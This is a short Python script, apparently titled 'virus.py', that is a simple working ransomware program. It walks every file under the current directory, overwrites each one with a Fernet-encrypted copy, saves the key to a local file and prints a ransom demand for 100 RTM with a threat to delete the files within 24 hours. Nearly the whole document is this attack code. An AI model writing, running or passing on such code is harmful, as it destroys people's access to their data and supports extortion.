#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

# Collect all files (including those in subdirectories)
files = []

# Walk through the entire directory tree
for root, dirs, filenames in os.walk("."):  # "." starts from the current directory
    for file in filenames:
        if file == "virus.py" or file == "thekey.key" or file == "decrypt.py":
            continue
        full_path = os.path.join(root, file)
        files.append(full_path)

print("Files to encrypt:", files)

# Generate a new encryption key
key = Fernet.generate_key()

# Save the key to a file
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

# Encrypt each file
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print("All your files have been encrypted!! Send me 100 RTM or I'll delete them in 24 hours")
